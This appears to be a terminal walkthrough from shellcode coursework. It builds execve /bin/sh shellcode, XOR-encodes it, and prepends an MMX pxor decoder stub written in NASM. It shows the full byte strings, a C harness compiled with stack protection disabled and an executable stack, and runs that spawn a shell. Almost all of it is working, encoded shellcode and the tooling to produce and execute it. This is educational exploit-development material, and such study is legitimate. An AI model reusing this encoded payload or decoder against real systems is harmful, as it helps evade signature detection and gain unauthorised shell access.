@@ -1,0 +1,141 @@
+XOR Decoder using MMX
+
+1.) Assemble and run
+kan1shka9@dev:~/Desktop/Remain/32$ ls
+execve-stack-sh  shellcode.c  XORencoder.py
+kan1shka9@dev:~/Desktop/Remain/32$ objdump -d ./execve-stack-sh|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+kan1shka9@dev:~/Desktop/Remain/32$ cat -n shellcode.c
+     1  #include<stdio.h>
+     2  #include<string.h>
+     3
+     4  unsigned char code[] = \
+     5  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+     6
+     7  main()
+     8  {
+     9
+    10      printf("Shellcode length: %d\n", strlen(code));
+    11
+    12      int (*ret)() = (int(*)())code;
+    13
+    14      ret();
+    15
+    16  }
+kan1shka9@dev:~/Desktop/Remain/32$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+kan1shka9@dev:~/Desktop/Remain/32$ ls
+execve-stack-sh  shellcode  shellcode.c  XORencoder.py
+kan1shka9@dev:~/Desktop/Remain/32$ ./shellcode
+Shellcode length: 25
+$ ps
+  PID TTY          TIME CMD
+10169 pts/16   00:00:01 bash
+10385 pts/16   00:00:00 sh
+10387 pts/16   00:00:00 ps
+$ exit
+
+2.) MMX XOR decoder
+kan1shka9@dev:~/Desktop/Remain/32$ nano XORencoder.py
+kan1shka9@dev:~/Desktop/Remain/32$ python XORencoder.py
+Encoded shellcode ...
+\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a
+0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,
+Len: 25
+kan1shka9@dev:~/Desktop/Remain/32$ ls
+compile_ld.sh  execve-stack-sh  mmx-xor-decoder.nasm  shellcode  shellcode.c  XORencoder.py
+kan1shka9@dev:~/Desktop/Remain/32$ ./compile_ld.sh mmx-xor-decoder
+[+] Assebling with Nasm ...
+[+] Linking ...
+[+] Done!
+kan1shka9@dev:~/Desktop/Remain/32$ ls
+compile_ld.sh    mmx-xor-decoder       mmx-xor-decoder.o  shellcode.c
+execve-stack-sh  mmx-xor-decoder.nasm  shellcode          XORencoder.py
+kan1shka9@dev:~/Desktop/Remain/32$ ./mmx-xor-decoder
+Segmentation fault (core dumped)
+kan1shka9@dev:~/Desktop/Remain/32$ objdump -d mmx-xor-decoder -M intel
+
+mmx-xor-decoder:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       eb 1b                   jmp    804807d <call_decoder>
+
+08048062 <decoder>:
+ 8048062:       5f                      pop    edi
+ 8048063:       8d 77 08                lea    esi,[edi+0x8]
+ 8048066:       31 c9                   xor    ecx,ecx
+ 8048068:       b1 04                   mov    cl,0x4
+
+0804806a <decode>:
+ 804806a:       0f 6f 07                movq   mm0,QWORD PTR [edi]
+ 804806d:       0f 6f 0e                movq   mm1,QWORD PTR [esi]
+ 8048070:       0f ef c1                pxor   mm0,mm1
+ 8048073:       0f 7f 06                movq   QWORD PTR [esi],mm0
+ 8048076:       83 c6 08                add    esi,0x8
+ 8048079:       e2 ef                   loop   804806a <decode>
+ 804807b:       eb 0d                   jmp    804808a <EncodedShellcode>
+
+0804807d <call_decoder>:
+ 804807d:       e8 e0 ff ff ff          call   8048062 <decoder>
+
+08048082 <decoder_value>:
+ 8048082:       aa                      stos   BYTE PTR es:[edi],al
+ 8048083:       aa                      stos   BYTE PTR es:[edi],al
+ 8048084:       aa                      stos   BYTE PTR es:[edi],al
+ 8048085:       aa                      stos   BYTE PTR es:[edi],al
+ 8048086:       aa                      stos   BYTE PTR es:[edi],al
+ 8048087:       aa                      stos   BYTE PTR es:[edi],al
+ 8048088:       aa                      stos   BYTE PTR es:[edi],al
+ 8048089:       aa                      stos   BYTE PTR es:[edi],al
+
+0804808a <EncodedShellcode>:
+ 804808a:       9b                      fwait
+ 804808b:       6a fa                   push   0xfffffffa
+ 804808d:       c2 85 85                ret    0x8585
+ 8048090:       d9 c2                   fld    st(2)
+ 8048092:       c2 85 c8                ret    0xc885
+ 8048095:       c3                      ret
+ 8048096:       c4 23                   les    esp,FWORD PTR [ebx]
+ 8048098:       49                      dec    ecx
+ 8048099:       fa                      cli
+ 804809a:       23 48 f9                and    ecx,DWORD PTR [eax-0x7]
+ 804809d:       23 4b 1a                and    ecx,DWORD PTR [ebx+0x1a]
+ 80480a0:       a1                      .byte 0xa1
+ 80480a1:       67                      addr16
+ 80480a2:       2a                      .byte 0x2a
+kan1shka9@dev:~/Desktop/Remain/32$
+kan1shka9@dev:~/Desktop/Remain/32$ objdump -d ./mmx-xor-decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\xeb\x1b\x5f\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x0d\xe8\xe0\xff\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
+kan1shka9@dev:~/Desktop/Remain/32$ ls
+compile_ld.sh  execve-stack-sh  mmx-xor-decoder  mmx-xor-decoder.nasm  mmx-xor-decoder.o  shellcode  shellcode.c  shellcode-mmx.c  XORencoder.py
+kan1shka9@dev:~/Desktop/Remain/32$ cat -n shellcode-mmx.c
+     1  #include<stdio.h>
+     2  #include<string.h>
+     3
+     4  unsigned char code[] = \
+     5  "\xeb\x1b\x5f\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x0d\xe8\xe0\xff\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";
+     6
+     7  main()
+     8  {
+     9
+    10      printf("Shellcode length: %d\n", strlen(code));
+    11
+    12      int (*ret)() = (int(*)())code;
+    13
+    14      ret();
+    15
+    16  }
+kan1shka9@dev:~/Desktop/Remain/32$ gcc -fno-stack-protector -z execstack shellcode-mmx.c -o shellcode-mmx
+kan1shka9@dev:~/Desktop/Remain/32$ ls
+compile_ld.sh  execve-stack-sh  mmx-xor-decoder  mmx-xor-decoder.nasm  mmx-xor-decoder.o  shellcode  shellcode.c  shellcode-mmx  shellcode-mmx.c  XORencoder.py
+kan1shka9@dev:~/Desktop/Remain/32$ ./shellcode-mmx
+Shellcode length: 67
+$ ps
+  PID TTY          TIME CMD
+10169 pts/16   00:00:02 bash
+10662 pts/16   00:00:00 sh
+10663 pts/16   00:00:00 ps
+$ exit
+kan1shka9@dev:~/Desktop/Remain/32$
